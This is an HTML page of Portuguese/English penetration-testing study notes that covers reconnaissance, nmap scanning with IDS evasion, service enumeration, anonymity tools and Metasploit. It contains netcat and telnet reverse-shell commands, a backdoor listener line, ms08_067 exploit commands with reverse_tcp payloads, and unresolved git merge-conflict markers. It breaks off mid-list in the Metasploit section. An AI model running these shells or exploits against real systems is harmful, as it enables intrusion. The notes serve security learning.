<!DOCTYPE html>
<html>
<head>
<title>Ethical Hacking</title>
<style>
body {
	font-family: Arial;
	font-size: 1.1rem;
	font-color: #332b2b;
}
a:link {
	text-decoration: none;
}
pre {
	background-color: #efefef;
	padding: 10px;
}
.code {
	font-family: monospace;
	background-color: #efefef;
	padding: 5px;
<<<<<<< HEAD
=======
	margin-bottom: 10px;
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
}
</style>
</head>
<body>

<div>
	<h1>Index</h1>
	<ul class="index">
		<li><a href="#types">Tipos de um Pentest</a></li>
		<li><a href="#phases">Fases de um Pentest</a></li>
		<li><a href="#terms">Termo de Responsabilidade e Confiabilidade</a></li>
		<li><a href="#reports">Relatório do Sumário Executivo e Laudo Técnico</a></li>
		<li>
			<a href="#gathering">Reconhecimento</a>
			<ul>
				<li><a href="#maltego">Maltego</a></li>
				<li><a href="#othertools">Ohter Tools</a></li>
			</ul>
		</li>
		<li>
			<a href="#scanning">Varredura</a>
			<ul>
				<li><a href="#nmap">nmap</a></li>
				<li><a href="#shodan">shodan</a></li>
			</ul>
		</li>
		<li>
			<a href="#enumeration">Enumeração</a>
			<ul>
				<li><a href="#openvas">Openvas</a></li>
				<li><a href="#targetdiscovery">Target Discovery</a></li>
				<li><a href="#targetexploitation">Target Exploitation</a></li>
				<li><a href="#osfingerprinting">OS Fingerprinting</a></li>
				<li><a href="#vulnerabilitymapping">Vulnerability Mapping</a></li>
				<li><a href="#smb">SMB Analysis</a></li>
				<li><a href="#smtp">SMTP Enumeration</a></li>
				<li><a href="#snmp">SNMP Enumeration</a></li>
				<li><a href="#sniffers">Network sniffers</a></li>
				<li><a href="#reconnaissance">Reconnaissance Tool</a></li>
				<li><a href="#vulnerabilityscanner">Vulnerability Scanner</a></li>
			</ul>
		</li>
		<li><a href="#anonimato">Anonimato</a></li>
		<li><a href="#reverseshell">Reverse Shell (NetCat)</a></li>
		<li>
			<a href="#metasploit">Metasploit</a>
			<ul>
				<li><a href="#serverside">Server Side</a></li>
				<li><a href="#clientside">Client Side</a></li>
				<li><a href="#auxiliary">Módulos Auxiliares do Metasploit</a></li>
				<li><a href="#meterpreter">Meterpreter Avançado</a></li>
			</ul>
		</li>
		<li>
			<a href="#webapp">Aplicações Web</a>
			<ul>
				<li><a href="#auditlogs">Audit Logs</a></li>
			</ul>
		</li>
		<li>
			<a href="#mapping">Mapping the Application</a>
			<ul>
				<li><a href="#enumeratingcontent">Enumerating Content and Functionality</a></li>
				<li><a href="#webappburp">Web app penetration testing with Burp Suite</a></li>
				<li><a href="#jbrofuzz">JBroFuzz</a></li>
				<li><a href="#database">Database Assessment Tools</a></li>
			</ul>
		</li>
		<li><a href="#webshells">Webshells</a></li>
		<li>
			<a href="#passwordcrack">Quebra de Senhas</a>
			<ul>
				<li><a href="#privilegeescalation">Privilege Escalation</a></li>
				<li><a href="#crunch">Crunch</a></li>
				<li><a href="#hydra">Hydra</a></li>
				<li><a href="#hashcat">Hashcat</a></li>
				<li><a href="#rainbowcrack">RainbowCrack</a></li>
				<li><a href="#samdump2">samdump2</a></li>
				<li><a href="#john">John the Ripper</a></li>
				<li><a href="#johnny">Johnny</a></li>
				<li><a href="#ophcrack">Ophcrack</a></li>
				<li><a href="#cewl">CeWL (Custom Word List)</a></li>
				<li><a href="#medusa">Medusa</a></li>
				<li><a href="#hashidentifier">hash-identifier</a></li>
			</ul>
		</li>
		<li>
			<a href="#redirection">Redirecionamento e Spoofing</a>
			<ul>
				<li><a href="#arpspoofing">ARP Spoofing</a></li>
				<li><a href="#dnsspoofing">DNS Spoofing</a></li>
				<li><a href="#dnschef">DNSChef</a></li>
				<li><a href="#arpspoof">arpspoof</a></li>
				<li><a href="#ettercap">Ettercap</a></li>
				<li><a href="#mim">Men in the middle remote</a></li>
			</ul>
		</li>
		<li>
			<a href="#socialengineering">Engenharia Social</a>
			<ul>
				<li><a href="#phising">Phising</a></li>
				<li><a href="#attackmethods">Attack Methods</a></li>
				<li><a href="#set">Social Engineering Toolkit (SET)</a></li>
			</ul>
		</li>
		<li><a href="#ids">Burlando IDS, Firewall e Antivirus</a></li>
		<li>
			<a href="#wireless">Wireless</a>
			<ul>
				<li><a href="#macchanger">macchanger</a></li>
				<li><a href="#airodump">airodump-ng</a></li>
				<li><a href="#airolib-ng">airolib-ng</a></li>
				<li><a href="#rainbowtables">Rainbow Tables</a></li>
				<li><a href="#quebrarchaves">Quebrar Chaves WEP e WPA</a></li>
				<li><a href="#wps">WPS</a></li>
			</ul>
		</li>
		<li><a href="#eviltwin">Evil Twin</a></li>
		<li><a href="#contramedidas">Contra Medidas</a></li>
		<li><a href="#acoes">Ações do Hacker Ético</a></li>
		<li><a href="#anotacoes">Anotações</a></li>
		<li><a href="#tools">Tools</a></li>
	</ul>
</div>

<div>
	<h1 id="types">Tipos de um Pentest</h1>
	<ol>
		<li>Black box: Teste realizado em um sistema remoto, sem nenhum conhecimento do alvo. O invasor deve partir da estaca zero, sem informações. Esse teste visa demonstrar a visão de um atacante de fora da intranet da empresa.
		</li>
		<li>Gray box: Teste realizado entre departamentos ou sub-redes de uma intranet, com conhecimento parcial da estrutura. O objetivo desse teste é demonstrar até que ponto um funcionário consegue chegar caso ele consiga tentar acessar um sistema que ele não tem acesso legítimo.
		</li>
		<li>White box: Teste realizado em uma rede local, com total conhecimento do alvo. A visão deste teste é de um administrador da rede. Essa metodologia é utilizada quando desejamos conhecer até onde um administrador poderá ir caso deseja acessar dados alheios.
		</li>
	</ol>
</div>

<div>
	<h1 id="phases">Fases de um Pentest</h1>
	<p>Varia de acordo com a certificação que você está buscando. A sequência é a mesma, apenas a forma de agrupar é que muda um pouco. Basicamente podemos dividir em 5 fases:</p>
	<ol>
<<<<<<< HEAD
		<li>Reconhecimento ou Coleta</li>
		<li>Varredura ou Descoberta ou Enumeração</li>
		<li>Ganhando acesso</li>
		<li>Mantendo acesso</li>
		<li>Cobrindo rastros</li>
=======
		<li>Pré-compromisso: Envolve conversar co mo cliente sobre os objetivos do penteste, definir o escopo (a extensão e os parâmetros do teste), e assim por diante. Quando um pentester e o cliente acordam sobre o escopo, o formato do relatório e outros tópicos, os testes começam.</li>
		<li>Reconhecimento/Coleta de Informações: Busca por informações públicas disponíveis sobre o cliente e identifica potenciais meios para se conectar aos seus sistemas.</li>
		<li>Varredura/Descoberta ou Enumeração: Utiliza as informações para determinar o valor de cada achado e o impacto para o cliente se isto permite um atacante invadir o sistema. Esta avaliação permite ao pentester desenvolver um plano de ação e um método de ataque.</li>
		<li>Exploração: Rodar alguns exploits em sistemas vulneráveis na tentativa de acessar o sistema do cliente.</li>
		<li>Mantendo acesso/Pós-exploração: Coleta de informações sobre o sistema atacado, busca por arquivos importantes, tentativa de elevação de privilégio...</li>
		<li>Relatório: Resumir os achados de forma clara para todos, desde o pessoal da TI responsáveis por ajustar as vulnerabilidades, até a alta gestão que contratam os auditores externos. Deve incluir um sumário executivo e um laudo técnico.</li>
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
	</ol>
</div>

<div>
<<<<<<< HEAD
	<h1 id="terms">Termo de Responsabilidade e Confiabilidade</h1>
	<p>NDA - Non Disclosure Agreement</p>
</div>

<div>
	<h1 id="reports">Relatório do Sumário Executivo e Laudo Técnico</h1>
	<div>Basicamente 2 versões:
		<p>1. Sumário executivo: preparado para os executivos da empresa. Ele condensa todos os problemas de uma forma visual, utilizando gráficos e tabelas para sintetizar todas as vulnerabilidades detectadas e as sugestões para correção das mesmas. Não possui informações técnicas profundas.</p>
		<p>2. Relatório técnico: preparado para os profissionais de segurança da empresa. Ele explica em detalhes todas as vulnerabilidades encontradas, mostrando tela a tela o resultado da exploração de cada problema, o impacto e sugestão de correção. É apresentado como se fosse um “tutorial” que foi feito.</p>
		<p>www.pentest-standard.org<br/>O pentester não arruma a segurança do cliente.</p>
	</div>
</div>

<div>
=======
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
	<h1 id="gathering">Reconhecimento</h1>
	<ul>
		<li>active: use networking traffic to the target.</li>
		<li>passive: get informations about the target using a third party’s service.</li>
	</ul>

	<p>The following are the resources that can be used:</p>
	<ul>
		<li><a href="http://research.domaintools.com/">http://research.domaintools.com/</a></li>
		<li><a href="http://www.robtex.com">http://www.robtex.com</a></li>
		<li><a href="http://serversniff.net.w3snoop.com/">http://serversniff.net.w3snoop.com/</a></li>
		<li><a href="http://www.archive.org">http://www.archive.org</a></li>
		<li><a href="http://www.alexa.com/">http://www.alexa.com/</a></li>
		<li><a href="http://centralops.net/">http://centralops.net/</a></li>
		<li><a href="http://www.pipl.com/">http://www.pipl.com/</a></li>
		<li><a href="http://www.isearch.com/">http://www.isearch.com/</a></li>
		<li><a href="http://www.tineye.com">http://www.tineye.com</a></li>
		<li><a href="https://www.sec.gov/edgar/searchedgar/companysearch.html">https://www.sec.gov/edgar/searchedgar/companysearch.html</a></li>
		<li><a href="https://whatismyip.org">https://whatismyip.org</a></li>
		<li><a href="http://blasze.tk">http://blasze.tk</a> Obtém IP da vítima através de uma URL gerada</li>
		<li><a href="http://censys.io">http://censys.io</a></li>
		<li><a href="http://shodan.io">http://shodan.io</a></li>
	</ul>

	<pre>
host -a example.com
host [ip]
dig
dnsenum
fierce
dmitry -p [domain] -f -b
netdiscover -r 10.0.0.1
nslookup [ip]
dig axfr dominio @ns
wget http://pkgs.fedoraproject.org/repo/pkgs/DMitry/DMitry-1.3a.tar.gz/8d578ba16de34b5cbebf6b767181b00d/DMitry-1.3a.tar.gz
	</pre>

	<h2 id="maltego">Maltego</h2>
	<p>
	Maltego is an open source intelligence and forensics application. It allows you to mine and gather information and represent the information in a meaningful way. The term open source in Maltego means that it gathers information from open source resources. After gathering the information, Maltego allows you to identify the key relationships between the information gathered.
	</p>
	<p>Maltego allows you to enumerate the following Internet infrastructure information:</p>
	<ul>
		<li>Domain names</li>
		<li>DNS names</li>
		<li>Whois information</li>
		<li>Network blocks</li>
		<li>IP addresses</li>
		<li>Companies and organizations related to the person</li>
		<li>E-mail addresses related to the person</li>
		<li>Websites related to the person</li>
		<li>Social networks related to the person</li>
		<li>Phone numbers related to the person</li>
		<li>Social Media Information</li>
	</ul>

	<h2 id="othertools">Other Tools</h2>
	<ul>
		<li><a href="https://github.com/leebaird/discover">discover</a>: Ferramenta para descobrir dados como subdominios e emails. Alternativa ao recon-ng.</li>
		<li><a href="http://spiderfoot.net">spiderfoot</a>: Uma ferramenta para OSINT.</li>
		<li><a href="https://bitbucket.org/mattinfosec/wordhound.git">wordhound</a>: Cria uma lista de password baseada em buscas no twitter e em pdfs para ser usada em ataques de brute force.
<<<<<<< HEAD
Outra opcao é o brutescrape https://github.com/cheetz/brutescrape.git.</li>
=======
Outra opcao é o <a href="https://github.com/cheetz/brutescrape.git">brutescrape</a>.</li>
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
		<li><a href="https://github.com/michenriksen/gitrob">gitrob</a>: Procura no github de uma organizacao por HTTP endpoints, session IDS, passwords, API keys, etc.</li>
		<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a>: Scanner mais rapido do que o nmap.</li>
		<li><a href="http://sparta.secforce.com/">sparta</a>: Scanner para pequenas redes, escrito em python e possui interface gráfica, adiciona pentest na execucao após cada fase e possui integracao com o hydra.</li>
		<li><a href="https://github.com/ChrisTruncer/EyeWitness">eyewitness</a>: EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.</li>
		<li><a href="http://thehackerblog.com/wmap-a-chrome-extension-for-taking-screenshots-of-web-services/">wmap</a>: A Chrome Extension for Taking Screenshots of Web Services In Bulk.</li>
		
		<li>tcptraceroute uses tcp syn. It's common firewall block UDP and ICMP.
		<div class="code">tcptraceroute www.example.com</div></li>
		<li>tctrace also uses TCP hand-shake.
		<div class="code">tctrace -i eth0 -d www.example.com</div></li>
		<li>theharvester is a handy tool to aggregate e-mail addresses and other information that a target may leak.
		<div class="code">theharvester -d example.com -l 100 -b linkedin</div></li>
		<li>Metagoogil is a tool that utilizes the Google search engine to get metadata from the documents available in the target domain.
		<div class="code">metagoofil -d example.com -l 20 -t doc,pdf –n 5 -f test.html -o test</div></li>
		<li>SimplyEmail include Reddit, Pastebin, and CanaryBin. One of the best features is that the tool creates a report in HTML, which comes in handy when you are preparing your report.</li>
	</ul>

	<h2>Videos</h2>
	<ul>
		<li><a href="https://www.youtube.com/watch?v=UNfjqnJS2wk">HACKER ÉTICO #2 - SHODAN - O "Google" dos Hackers</a></li>
	</ul>

	<h2>Links</h2>
	<ul>
		<li><a href="http://dnstats.net">http://dnstats.net</a></li>
		<li><a href="http://deepdotweb.com">http://deepdotweb.com</a></li>
		<li><a href="http://darknetmarkets.org">http://darknetmarkets.org</a></li>
		<li><a href="http://nmap.org/book/man- bypass-firewalls-ids.html">http://nmap.org/book/man- bypass-firewalls-ids.html</a></li>
	</ul>

</div>

<div>
	<h1 id="scanning">Varredura</h1>
	<p>portas interessantes: 80, 21, 22, 445, 5800, 5900, 8080, 3606, 5432, nfs/2049</p>

	<h2 id="nmap">nmap</h2>
	<p>The biggest problem with the UDP scan is how to perform the scan quickly. A Linux kernel limits the sending of the ICMP Port Unreachable message to one message per second.
In the default configuration, Nmap will only scan the 1000 most common ports for each protocol randomly.</p>
	<p>Nmap comes with six timing modes that you can set with options (-T):</p>
	<ul>
		<li>paranoid (0): In this timing mode, a packet is sent every five minutes. The packets are sent in series. This mode is useful for avoiding IDS detection.</li>
		<li>sneaky (1): This mode sends a packet every 15 seconds, and there are no packets sent in parallel.</li>
		<li>polite (2): This mode sends a packet every 0.4 seconds, and there is no parallel transmission.</li>
		<li>normal (3): This mode sends multiple packets to multiple targets simultaneously. This is the default timing mode used by Nmap. It balances between time and network load.</li>
		<li>aggressive (4): Nmap will scan a given host only for five minutes before moving on to the next target. Nmap will not wait more than 1.25 seconds for a response.</li>
		<li>insane (5): In this mode, Nmap will scan a given host for only 75 seconds before moving on to the the next target. Nmap will not wait for more than 0.3 seconds for a response.</li>
	</ul>

	<p>Options:</p>
	<pre>
-sn ou -sn # -s é ping e -n nao resolver nomes.
-sS #(só como root) é mais rapido do que -sT. meia conexao.
-sT # conexao completa
-sA # burlar firewall
-sV # versao dos servicos
-iL # addresses.txt
-sU # protocolo udp
-oN result.txt
-P0 # avoid ping before scan
-D ip1 ip2 ipN… # finge que os outros ips tambem estao fazendo a varredura
-oX # output no formato xml. xsltproc myscan.xml -o myscan.html to convert xml to html
-sV # software version in specific port
-O operation system
-Pn # disable host discovery. util para quando o firewall bloqueia icmp request
-A # aggressive scan (-sV -O -sC --traceroute)
-6 # for ipv6
-sC or --script=default
--script [filename] | [category] | [directories]
--script-args [args]
--script=version,vuln,http-*
--script-help http-dlink-backdoor.nse # scripts in /usr/share/nmap/scripts
-T5
	</pre>

	<p>For IDS</p>
	<pre>
-f (fragment packets): split the packet into 8 bytes or less after the IP header
--mtu: With this option, you can specify your own packet size fragmentation. The Maximum Transmission Unit (MTU) must be a multiple of eight or Nmap will give an error, and exit.
--data-length: This option is used to change the default data length sent by Nmap in order to avoid being detected as Nmap scans.
--max-parallelism: This option is usually set to one in order to instruct Nmap to send no more than one probe at a time to the target host.
--scan-delay [time]: This option can be used to evade IDS/IPS that uses a threshold to detect port scanning activity.
	</pre>
	
	<p>Usage examples</p>
	<pre>
nmap -sU 172.16.43.156 -p 53,161
nmap –sU 192.168.5.0-255
nmap -v -p 80 --script=http-vuln-cve2010-2861 192.168.99.100
nmap -v -p 80 --script=http-vuln-cve2011-3192 192.168.99.100-254
nmap -v -p 80 --script=ftp-anon.nse 192.168.99.100-254
nmap -v -p 80 --script=smb-security-mode IP
nmap --script http-enum,http-headers,http-methods,http-php-version -p 80 172.16.43.156
wget http://www.computec.ch/mruef/software/nmap_nse_vulscan-1.0.tar.gz
nmap -A -oX resultado.xml 192.168.99.100-112
https://sourceforge.net/projects/valhalahoneypot/files/OldFiles/valscan101br.zip/download
	</pre>

	<h2 id="shodan">shodan</h2>
	<p>net:200.131.250.0/24<br>port:21<br>os:”windows xp"</p>
</div>

<div>
	<h1 id="enumeration">Enumeração</h1>
	<p>Descobrir falhas nos serviços descobertos através das varreduras.<br>
	Buscar no google pelo banner do serviço + exploit ou vulnerability.<br>
	Sites: www.exploit-db.com e securityfocus.com
	</p>

	<p>Scanner de vulnerabilidades genéricas:</p>
	<ul>
		<li>Nessus</li>
		<li>Acunetix (somente para web)</li>
		<li>OpenVAS (Autores do Nessus)</li>
		<li>w3af</li>
		<li>Owaspzap (somente web)</li>
	</ul>

	<h2 id="openvas">OpenVAS</h2>
	<p>OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution.</p>
	<pre>
vim /etc/default/openvas-* # replace 127.0.0.1 to 0.0.0.0
vim /etc/default/greenbone-security-assistent
echo 1 > /proc/sys/net/ipv4/ip_forward
sysctl -w net.ipv4.conf.eth0.route_localnet=1
openvasmd --user=admin --new-password=admin
iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 443 -j DNAT --to 127.0.0.1:9392
iptables -t nat -A POSTROUTING -p tcp -o eth0 --sport 443 -j SNAT --to 0.0.0.0:9000
openvas-setup
open http://localhost:9392
openvas-adduser
openvas-nvt-sync
	</pre>

	<h2 id="targetdiscovery">Target Discovery</h2>
	<ul>
		<li>arping tool operates on Open Systems Interconnection (OSI) layer 2 (network layer), and it can only be used in a local network. Moreover, ARP cannot be routed across routers or gateways.
		<div class="code">arping 172.16.43.156 -c 1</div></li>

		<li>Another common use of arping is to detect duplicate IP addresses in a local network.
		<div class="code">arping -d -i eth0 172.16.43.156 -c 2 && echo $? # 1 = ip is used</div></li>

		<li>Fping is a popular tool used to identify whether a given host is connected to a network or not. It is a tool can be used to send a ping (ICMP echo) request to several hosts at once.
		<div class="code">fping 172.16.43.156 172.16.43.150 172.16.43.155<br>
		fping -g 172.16.43.0/24</div></li>

		<li>nping tool is a tool that allows users to generate network packets of a wide range of protocols (TCP, UDP, ICMP, and ARP) and supports multiple target hosts and port speci cation.
		<div class="code">nping -c 1 172.16.43.154-157</div></li>

		<li>nbtscan tool will produce a report that contains the IP address, NetBIOS computer name, services available, logged in username, and MAC address of the corresponding machines. The NetBIOS name is useful if you want to access the service provided by the machine using the NetBIOS protocol that is connected to an open share. Be careful, as using this tool will generate a lot of traf c and it may be logged by the target machines.
		<div class="code">nbtscan 172.16.43.1-254<br>
		nbtscan -hv 172.16.43.1-254</div></li>

		<li>tcpdump <div class="code">tcpdump -nnX tcp and host 172.16.43.150</div></li>

		<li>Amap is a tool that can be used to check the application running on a speci c port.
		<div class="code">amap -bq 172.16.43.156 22</div></li>

		<li>nbtscan tool can be used to scan the IP addresses for the NetBIOS name information.
		<div class="code">nbtscan 172.16.43.1-254<br>nbtscan -hv 172.16.43.156</div></li>

		<li>onesixtyone tool can be used as a SNMP scanner to nd whether the SNMP string exists on a device.
		<div class="code">onesixtyone 172.16.43.156<br>onesixtyone -d 172.16.43.156</div></li>

		<li>snmpcheck <div class="code">snmpcheck -t 192.168.56.103</div></li>

		<li>ike-scan tool is a security tool that can be used to discover, ngerprint, and test the IPsec VPN systems.
		<div class="code">ike-scan -M -A –Pike-hashkey 192.168.0.10</div></li>

		<li>Cisco Auditing Tool (CAT) is a mini security-auditing tool. It scans Cisco routers for common vulnerabilities such as default passwords, SNMP community strings, and some old IOS bugs.
		<div class="code">CAT --help<br>
		cd /usr/share/ cisco-auditing-tool/lists<br>
		CAT -h ww.xx.yy.zz -w lists/community -a lists/passwords -i</div></li>

		<li>Cisco Global Exploiter (CGE) is a small Perl script that combines 14 individual vulnerabilities that can be tested against the Cisco devices.
		<div class="code">cge.pl 10.200.213.25 3<br>
		cisco.com/security/center/viewAlert.x?alertId=37711</div></li>
	</ul>

	<h2 id="targetexploitation">Target Exploitation</h2>
	<p>Target exploitation is one area that sets a penetration test apart from a vulnerability assessment. Now that vulnerabilities have been found, you will actually validate and take advantage of these vulnerabilities, by exploiting the system, in the hope of gaining full control or additional information and visibility into the targeted network, and the systems therein.</p>
	<p>The following is a list of online repositories:</p>
	<ul>
		<li><a href="http://www.securityfocus.com">Security Focus</a></li>
		<li><a href="http://osvdb.org">OSVDB</a></li>
		<li><a href="http://www.packetstormsecurity.org">Packet Storm</a></li>
		<li><a href="http://nvd.nist.gov">National Vulnerability Database</a></li>
		<li><a href="https://exchange.xforce.ibmcloud.com/">IBM X-Force Exchange</a></li>
		<li><a href="http://www.kb.cert.org/vuls">Vulnerability Notes Database</a></li>
		<li><a href="http://www.us-cert.gov/cas/techalerts/">US-CERT</a></li>
		<li><a href="http://www.securiteam.com">SecuriTeam</a></li>
		<li><a href="http://www.governmentsecurity.org">Government Security</a></li>
		<li><a href="http://secunia.com/advisories/historic/">Secunia Research Community</a></li>
		<li><a href="http://cxsecurity.com">CX Security</a></li>
		<li><a href="http://www.xssed.com">XSSed</a></li>
		<li><a href="http://securityvulns.com">Computer Security Vulnerabilities</a></li>
		<li><a href="http://www.sebug.net">Seebug</a></li>
		<li><a href="http://www.bugreport.ir">BugReport</a></li>
		<li><a href="http://techblog.mediaservice.net">Tech Blog MediaService</a></li>
		<li><a href="http://www.intelligentexploit.com">Intelligent Exploit</a></li>
		<li><a href="http://www.hack0wn.com">Hack0wn</a></li>
	</ul>

	<h2 id="osfingerprinting">OS Fingerprinting</h2>
	<p>2 methods:</p>
	<ul>
		<li>active is fast because the tool sends network packets to the target machine.
		<div class="code">nmap -O [ip]</div></li>
		<li>passive is slower than active but reduces the interaction between the testing machine and the target.
		<div class="code"><a href="http://lcamtuf.coredump.cx/p0f3/releases/p0f-3.09b.tgz">p0f</a> -i eth0 -o result.log</div></li>
	</ul>

	<h2 id="vulnerabilitymapping">Vulnerability Mapping</h2>
	<p>Classes of vulnerabilities:</p>
	<ul>
		<li>Design vulnerabilities: These are discovered owing to the weaknesses found in the software specifications.</li>
		<li>Implementation vulnerabilities: These are the technical security glitches found in the code of a system.</li>
		<li>Operational vulnerabilities: These are the vulnerabilities that may arise, owing to the improper configuration and deployment of a system in a specific environment.</li>
	</ul>

	<p>2 types:</p>
	<ul>
		<li>Local: A condition on which the attacker requires local access, in order to trigger the vulnerability by executing a piece of code.</li>
		<li>Remote: It is a condition where the attacker has no prior access, but the vulnerability can still be exploited by triggering the malicious piece of code over the network.</li>
	</ul>

	<p>Security taxonomy</p>
	<ul>
		<li><a href="http://www.hpenterprisesecurity.com/vulncat/en/vulncat/index.html">HP software security</a></li>
		<li><a href="http://www.cigital.com/papers/download/bsi11-taxonomy.pdf">Seven pernicious kingdoms</a></li>
		<li><a href="http://cwe.mitre.org/data/index.html">Common weakness enumeration</a></li>
		<li><a href="http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP Top 10</a></li>
		<li><a href="http://www.klocwork.com/products/documentation/Insight-9.1/Taxonomy">Klocwork</a></li>
		<li><a href="http://www.grammatech.com">GrammaTech</a></li>
		<li><a href="http://projects.webappsec.org/Threat-Classification">WASC threat classification</a></li>
	</ul>

	<h2 id="smb">SMB Analysis</h2>
	<p>Server Message Block (SMB) is an application-layer protocol, which is commonly used to provide le and printer sharing services. Moreover, it is also capable of handling the shared services between serial ports and laying miscellaneous communications between different nodes on the network. It is also known as Common Internet File System (CIFS).
	<br>Samrdump is an application that retrieves sensitive information about the speci ed target using the Security Account Manager (SAM), which is a remote interface that is accessible under the distributed computing environment / remote procedure calls (DCE/RPC) service. It lists out all the system shares, user accounts, and other useful information about the target's presence in the local network.</p>
	<pre>
cd /usr/share/doc/python-impacket/examples/
python samrdump.pyp
python samrdump.py user:pass@ip port/SMB
python samrdump.py h4x:123@192.168.0.7 445/SMB
	</pre>

	<pre>
nmap -v -p 139,445 -oG smb1.txt 192.168.5.0-255
nbtscan -r 192.168.1.0/24
enum4linux -a 192.168.1.20
ls /usr/share/nmap/scripts
nmap -v -p 139,445 --script=smb-os-discovery 192.168.99.10
nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.190.10
	</pre>

	<h2 id="smtp">SMTP Enumeration</h2>
	<pre>
nc -nv 192.168.99.100 25
VRFY root
	</pre>

	<pre>
#!/usr/bin/python
import socket, sys
if len(sys.argv) != 2:
    print 'Usage: vrfy.py [username]'
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((‘192.168.99.100’, 25))
banner = s.recv(1024)
print banner
s.send('VRFY' + sys.argv[1] + '\r\n')
result = s.recv(1024)
print result
s.close()
	</pre>

	<h2 id="snmp">SNMP Enumeration</h2>
	<pre>
nmap -sU —open -p 161 192.168.99.100-254 -oG mega-snmp.txt
echo -e “public\nprivate\nmanager” > community.txt
onesixtyone -c community.txt -i ips.txt
snmpwalk -c public -v1 192.168.99.100
snmpwalk -c public -v1 192.168.99.100 1.3.6.1.4.1.77.1.2.25
	</pre>

	<h2 id="sniffers">Network sniffers</h2>
	<p>A network sniffer is a software program or a hardware device that is capable of monitoring the network data. It is usually used to examine the network traffic by copying the data without altering the content. With a network sniffer, you can see what information is available in your network.</p>

	<h2 id="reconnaissance">Reconnaissance Tool</h2>
	<pre>
recon-ng
use recon/domains-hosts/bing_domain_web
set SOURCE hackthissite.org
run
	</pre>

	<h2 id="vulnerabilityscanner">Vulnerability Scanner</h2>
	<ul>
		<li>NeXpose Vulnerability Scanner Community Edition (NeXpose CE) is a free vulnerability scanner from Rapid7 that scans devices for vulnerabilities. It can also be integrated with the Metasploit exploit framework.
			<div class="code">
			http://download2.rapid7.com/download/NeXpose-v4/NeXposeSetup-Linux64.bin<br>
			key: 16DC-YWW8-V8FK-ZLDT<br>
			./NeXposeSetup-Linux64.bin -q -overwrite -Vfirstname='Nexpose' -Vlastname='VA' -Vcompany='Rapid7' -Vusername='nxadmin' -Vpassword1='nxpassword' -Vpassword2='nxpassword' -Vsys.component.typical\$Boolean=true -Vsys.component.engine\$Boolean=false -VinitService\$Boolean=false
			</div>
		</li>
		<li>Vega: Vega is an open source framework specifically designed for web testing.</li>
	</ul>
</div>

<div>
	<h1 id="anonimato">Anonimato</h1>
	<ul>
		<li>TOR: Instalar o e verificar se o está OK em <a href="http://dnsleaktest.com">DNS Leak Test</a></li>
		<li>Duck Duck Go: utilizar o <a href="http://duckduckgo.com">http://duckduckgo.com</a> para buscas no lugar do google que rastreia IPs.</li>
		<li>Deep Web: Hidden wiki como porta de entrada da deep web.</li>
		<li>Proxy Chains: Usar com dynamic_chain. Usar o proxy em sequencia e caso nao funcione, pula ele.
		<div class="code">proxychains nmap [ip]</div></li>
		<li><a href="https://socks-proxy.net/">Free Proxy List</a></li>
		<li>OpenVPN: <div class="code">openvpn [file-vpn] # vpnbook.com</div></li>
		<li><a href="https://www.mullvad.net/en/">Mullvad is a VPN service that helps keep your online activity, identity, and location private.</a></li>
		<li><a href="https://hide.me/en/proxy">Hide me: Free Anonymous Proxy Browser</a></li>
	</ul>
</div>

<div>
	<h1 id="reverseshell">Reverse Shell</h1>

	<h2 id="netcat">NetCat</h2>
	<p>Para reverse shell, executar no atacante nc -nvlp 80 e fazer a máquina vítima se conectar usando nc [ip publico] 80 -e /bin/bash.
</p>
	<pre>
nc -nvlp 80
nc 10.0.0.1 80 -e /bin/bash
	</pre>

	<p>Usando Telnet:
		<br>Executa na vítima o comando telnet [ip publico atacante] 3000 | /bin/bash | telnet [ip publico] 2000
		<div class="code">nc -nvlp 2000 < shell.php e na maquina da vítima nc [ip] 2000 > shell.php</div>
	</p>

	<p>Abrir uma porta local</p>
	<pre>
nc -nlp 1000 -v
nc -l -p 9090 -e /bin/bash -v # backdoor
#para windows deve fazer o upload do nc e executar o cmd.exe
	</pre>

	<h2>DNS Dinâmico para conexão reversa</h2>
	<ul>
		<li><a href="https://www.noip.com/">NoIP</a></li>
		<li><a href="http://dyn.com">Dyn DNS</a></li>
	</ul>

	<h2>Links</h2>
	<ul>
		<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
	</ul>
</div>

<div>
	<h1 id="metasploit">Metasploit</h1>

	<h2 id="serverside">Server Side</h2>
	<pre>
service start postgres
su postgres
createuser msf -P
createdb —owner=msf msf
vim config/database.yml
db_rebuild_cache
msfupdate

use exploit
set PAYLOAD
exploit

msfconsole
db_status
db_export -f xml /tmp/meta.xml
db_import /tmp/resultado_nmap.xml # importa xml de outros programas
hosts
services
db_nmap -A 192.168.1.1 # executa o nmap e joga o resultado para base de dados
search cve:2015 type:exploit app:client # exploits do lado cliente em 2015
search fileformat
search netapi
use exploit/windows/smb/ms08_067_netapi # usa o exploit selecionado
info exploit/windows/smb/ms08_067_netapi
show options # mostra quais opcoes devem ser configuradas
show missing
setg LHOST 192.168.99.10 # set global para todos os exploits
set PAYLOAD windows/shell/bind_tcp # vai abrir uma porta na vitima que precisa ter um ip publico
set PAYLOAD windows/shell/reverse_tcp
exploit # roda o exploit
Ctrl + z para voltar ao msfconsole
sessions -h
session -u 1 # tenta atualizar para usar o mertepreter
search post/windows # mostra os scripts que podem rodar após conseguir rodar o meterpreter na sessao

msfconsole -x “use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.11.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.11.10; run"
msfconsole -r script.rc
connect [ip] # mini netcat
grep -i adduser search payload/windows # filtrar a busca

# Kali Linux comes with the integration of Exploit database from Offensive Security:
cd /usr/share/exploitdb/
vim files.csv
ls /usr/share/exploitdb/platforms/
cat files.csv |cut -d"," -f3
	</pre>

	<p>Metasploit Modules:</p>
	<ul>
